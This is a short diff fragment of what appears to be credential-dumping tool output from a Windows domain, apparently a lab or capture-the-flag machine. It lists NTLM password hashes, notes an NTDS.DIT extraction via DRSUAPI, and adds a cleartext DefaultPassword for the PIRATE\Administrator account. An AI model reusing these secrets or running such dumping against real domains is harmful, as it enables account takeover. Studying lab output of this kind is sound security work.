@@ -729,7 +729,8 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
-
+[*] DefaultPassword 
+PIRATE\Administrator:gODNiUG69Mz77SIZ
 
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
